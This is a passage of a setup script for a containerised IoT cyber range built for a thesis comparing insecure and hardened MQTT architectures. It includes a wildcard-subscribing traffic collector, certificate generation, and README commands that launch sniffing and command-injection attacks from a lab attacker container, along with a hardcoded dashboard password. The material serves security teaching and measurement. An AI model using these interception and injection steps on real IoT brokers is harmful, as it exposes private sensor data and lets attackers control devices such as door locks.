      SENSOR_TYPE:      humidity
    networks:
      iot_device_net:
        ipv4_address: 10.20.1.102
    volumes:
      - ./broker/certs:/certs:ro
    depends_on:
      - broker

  iot-device-3:
    build: ./iot-device
    container_name: secure_device_3
    environment:
      DEVICE_ID:        device-003
      BROKER_HOST:      10.20.1.10
      BROKER_PORT:      8883
      CA_CERT:          /certs/ca.crt
      CLIENT_CERT:      /certs/device-003.crt
      CLIENT_KEY:       /certs/device-003.key
      PUBLISH_INTERVAL: 10
      SENSOR_TYPE:      door_lock
    networks:
      iot_device_net:
        ipv4_address: 10.20.1.103
    volumes:
      - ./broker/certs:/certs:ro
    depends_on:
      - broker

  # ---------------------------------------------------------------------------
  # Attacker Container — same scripts as insecure env, attacks will fail
  # Placed only on iot_device_net — cannot reach backend or monitor networks.
  # ---------------------------------------------------------------------------
  attacker:
    build: ./attacker
    container_name: secure_attacker
    networks:
      iot_device_net:
        ipv4_address: 10.20.1.200
    command: tail -f /dev/null

  # ---------------------------------------------------------------------------
  # Suricata IDS — passive network monitoring with custom IoT rules
  # Spans all three networks for full traffic visibility.
  # ---------------------------------------------------------------------------
  ids:
    build: ./ids
    container_name: secure_ids
    networks:
      iot_device_net:
        ipv4_address: 10.20.1.250
      iot_backend_net:
        ipv4_address: 10.20.2.250
      iot_monitor_net:
        ipv4_address: 10.20.3.250
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - ./ids/rules:/etc/suricata/rules/custom:ro
      - ./ids/logs:/var/log/suricata
    restart: unless-stopped
EOF

# ==============================================================================
# METRICS COLLECTOR
# ==============================================================================

cat > metrics/collector.py << 'EOF'
#!/usr/bin/env python3
"""
Metrics Collector — Comparative Analysis Tool

Connects to an MQTT broker as a passive observer and collects metrics that
can be used to quantitatively compare the insecure and secure architectures
in the thesis.

Metrics collected:
    - time_to_first_message   : seconds until first message intercepted
    - devices_discovered      : number of unique devices found
    - topics_discovered       : number of unique topics observed
    - messages_intercepted    : total messages seen
    - payloads_decoded        : messages with valid JSON payloads
    - attack_success_rate_%   : percentage of commands accepted by devices
    - detection_rate_%        : percentage of attacks detected (secure arch)

Usage:
    python collector.py [scenario] [broker_host] [duration_seconds]
    python collector.py insecure 10.10.0.10 60
    python collector.py secure   10.20.1.10 60
"""

import json
import time
import os
import sys
import paho.mqtt.client as mqtt
from dataclasses import dataclass, asdict, field
from typing import Optional


@dataclass
class AttackMetrics:
    """Container for all collected metrics for a single test run."""
    scenario:   str
    test_start: float = field(default_factory=time.time)

    # Discovery metrics
    time_to_first_message:  Optional[float] = None
    devices_discovered:     int = 0
    topics_discovered:      int = 0

    # Traffic metrics
    messages_intercepted: int = 0
    payloads_decoded:     int = 0

    # Attack effectiveness metrics
    commands_sent:     int = 0
    commands_accepted: int = 0

    # Detection metrics (relevant for secure architecture)
    ids_alerts:       int = 0
    attacks_detected: int = 0
    attacks_missed:   int = 0

    def attack_success_rate(self) -> float:
        """Ratio of accepted commands to total commands sent."""
        return self.commands_accepted / self.commands_sent if self.commands_sent > 0 else 0.0

    def detection_rate(self) -> float:
        """Ratio of detected attacks to total attack events."""
        total = self.attacks_detected + self.attacks_missed
        return self.attacks_detected / total if total > 0 else 0.0

    def to_report(self) -> dict:
        """Serialize metrics to a flat dict with computed percentage fields."""
        d = asdict(self)
        d["attack_success_rate_%"] = round(self.attack_success_rate() * 100, 1)
        d["detection_rate_%"]      = round(self.detection_rate() * 100, 1)
        return d


class MetricsCollector:
    """
    Passive MQTT observer that accumulates security metrics for a test run.
    Can be used against both the insecure and secure architectures.
    """

    def __init__(self, scenario: str, broker_host: str, broker_port: int = 1883):
        self.metrics     = AttackMetrics(scenario=scenario)
        self.broker_host = broker_host
        self.broker_port = broker_port
        self._devices    = set()
        self._topics     = set()

    def start_passive_monitoring(self, duration: int = 60) -> None:
        """
        Connect to the broker and observe all traffic for the given duration.
        On the secure architecture, the connection itself will likely fail
        (no valid certificate), which is recorded as a metric.
        """
        start = time.time()

        def on_connect(client, userdata, flags, rc):
            client.subscribe("#")
            print(f"[METRICS] Passive monitoring started on {self.broker_host} for {duration}s")

        def on_message(client, userdata, msg):
            now = time.time()
            self._topics.add(msg.topic)
            self.metrics.messages_intercepted += 1

            if self.metrics.time_to_first_message is None:
                self.metrics.time_to_first_message = now - start
                print(f"[METRICS] First message after {self.metrics.time_to_first_message:.2f}s")

            parts = msg.topic.split("/")
            if len(parts) >= 2 and parts[0] == "iot":
                dev = parts[1]
                if dev not in self._devices:
                    self._devices.add(dev)
                    print(f"[METRICS] New device discovered: {dev}")

            try:
                json.loads(msg.payload.decode())
                self.metrics.payloads_decoded += 1
            except Exception:
                pass

        client = mqtt.Client(client_id="metrics-collector")
        client.on_connect = on_connect
        client.on_message = on_message

        try:
            client.connect(self.broker_host, self.broker_port)
            client.loop_start()
            time.sleep(duration)
            client.loop_stop()
            client.disconnect()
        except Exception as e:
            print(f"[METRICS] Connection failed (expected on secure arch): {e}")

        self.metrics.devices_discovered = len(self._devices)
        self.metrics.topics_discovered  = len(self._topics)

    def save(self, output_dir: str = "/metrics") -> str:
        """Save the metrics report to a JSON file and print a summary."""
        os.makedirs(output_dir, exist_ok=True)
        report = self.metrics.to_report()
        fname  = f"{output_dir}/{self.metrics.scenario}_{int(time.time())}.json"

        with open(fname, "w") as f:
            json.dump(report, f, indent=2)

        print(f"\n[METRICS] Report saved: {fname}")
        print(json.dumps(report, indent=2))
        return fname


if __name__ == "__main__":
    scenario    = sys.argv[1] if len(sys.argv) > 1 else "insecure"
    broker_host = sys.argv[2] if len(sys.argv) > 2 else "10.10.0.10"
    duration    = int(sys.argv[3]) if len(sys.argv) > 3 else 60

    collector = MetricsCollector(scenario, broker_host)
    collector.start_passive_monitoring(duration)
    collector.save("/metrics")
EOF

# ==============================================================================
# SCRIPTS
# ==============================================================================

cat > scripts/gen_certs.sh << 'EOF'
#!/bin/bash
# =============================================================================
# gen_certs.sh — TLS Certificate Generation Script
#
# Generates a self-signed CA and issues certificates for all components
# of the secure architecture. Must be run before starting the secure stack.
#
# Certificates generated:
#   ca.crt / ca.key             - Root Certificate Authority
#   broker.crt / broker.key     - MQTT broker server certificate
#   device-00X.crt / .key       - One certificate per IoT device
#   backend.crt / backend.key   - Backend service certificate
#   ids-monitor.crt / .key      - IDS read-only monitor certificate
#
# Usage:
#   bash scripts/gen_certs.sh
# =============================================================================

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CERT_DIR="$SCRIPT_DIR/../secure/broker/certs"
mkdir -p "$CERT_DIR"
cd "$CERT_DIR"

echo "[*] Generating Certificate Authority..."
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 3650 -key ca.key -out ca.crt \
    -subj "/CN=IoTCyberRangeCA/O=Thesis/C=IT"

echo "[*] Generating broker certificate..."
openssl genrsa -out broker.key 2048
openssl req -new -key broker.key -out broker.csr \
    -subj "/CN=broker/O=Thesis/C=IT"
openssl x509 -req -days 3650 -in broker.csr \
    -CA ca.crt -CAkey ca.key -CAcreateserial -out broker.crt

for DEVICE in device-001 device-002 device-003; do
    echo "[*] Generating certificate for $DEVICE..."
    openssl genrsa -out "$DEVICE.key" 2048
    openssl req -new -key "$DEVICE.key" -out "$DEVICE.csr" \
        -subj "/CN=$DEVICE/O=Thesis/C=IT"
    openssl x509 -req -days 365 -in "$DEVICE.csr" \
        -CA ca.crt -CAkey ca.key -CAcreateserial -out "$DEVICE.crt"
done

for NAME in backend ids-monitor; do
    echo "[*] Generating certificate for $NAME..."
    openssl genrsa -out "$NAME.key" 2048
    openssl req -new -key "$NAME.key" -out "$NAME.csr" \
        -subj "/CN=$NAME/O=Thesis/C=IT"
    openssl x509 -req -days 365 -in "$NAME.csr" \
        -CA ca.crt -CAkey ca.key -CAcreateserial -out "$NAME.crt"
done

rm -f ./*.csr ./*.srl

echo ""
echo "[+] All certificates generated in: $CERT_DIR"
ls -la "$CERT_DIR"
EOF
chmod +x scripts/gen_certs.sh

# ==============================================================================
# README
# ==============================================================================
cat > README.md << 'EOF'
# IoT Cyber Range — Experimental Thesis Environment

Container-based mini cyber range for demonstrating IoT security vulnerabilities
and the effectiveness of ecosystem-level security countermeasures.

## Architecture

```
insecure/   Vulnerable stack: no TLS, no auth, flat network
secure/     Hardened stack:   mTLS, ACL, segmented network, IDS
metrics/    Comparative metrics collector
scripts/    Certificate generation and orchestration
```

## Prerequisites

```bash
docker --version        # >= 20.x
docker compose version  # >= 2.x
openssl version         # pre-installed on macOS
```

## Insecure Architecture

```bash
cd insecure
docker compose up -d --build

# Verify devices are publishing
docker logs insecure_device_1

# Verify backend API (unauthenticated)
curl http://localhost:5050/api/devices

# Attack 1: MQTT sniffing (30s)
docker exec insecure_attacker python /attacks/attack_01_sniff.py 10.10.0.10 30

# Attack 2: command injection + lateral movement
docker exec insecure_attacker python /attacks/attack_02_cmd_inject.py 10.10.0.10

# Verify attack effects on door lock device
docker logs insecure_device_3

# Open Grafana dashboard
open http://localhost:3000   # admin / thesis2024
```

## Secure Architecture

```bash
# Step 1: generate TLS certificates (run once)
bash scripts/gen_certs.sh

# Step 2: start the secure stack
cd secure
docker compose up -d --build

# Step 3: run the same attacks — they will fail
docker exec secure_attacker python /attacks/attack_01_sniff.py 10.20.1.10 30
docker exec secure_attacker python /attacks/attack_02_cmd_inject.py 10.20.1.10

# Step 4: check IDS alerts
docker exec secure_ids cat /var/log/suricata/fast.log
```

## Attack vs Defence Summary

| Attack                | Insecure | Secure          |
|-----------------------|----------|-----------------|
| MQTT sniffing         | ✅ Full access | ❌ TLS encrypted |
| Topic enumeration     | ✅ Wildcard `#` | ❌ ACL blocks it |
| Command injection     | ✅ No validation | ❌ HMAC required |
| Data poisoning        | ✅ Accepted | ❌ Signature fail |
| Lateral movement      | ✅ Flat network | ❌ Segmented nets |
| API scraping          | ✅ No auth | ❌ Token required |

## Cleanup

```bash
cd insecure && docker compose down
cd ../secure  && docker compose down
```
EOF

# ==============================================================================
# Final summary
# ==============================================================================
echo ""
echo "=============================================="
echo " Setup complete!"
echo "=============================================="
echo ""
echo " Files created:"
find . -type f | sort
echo ""
echo " Next steps:"
echo "   1. cd insecure"
echo "   2. docker compose up -d --build"
echo "   3. open http://localhost:3000  (Grafana)"
echo "   4. docker exec insecure_attacker python /attacks/attack_01_sniff.py 10.10.0.10 30"
echo "=============================================="
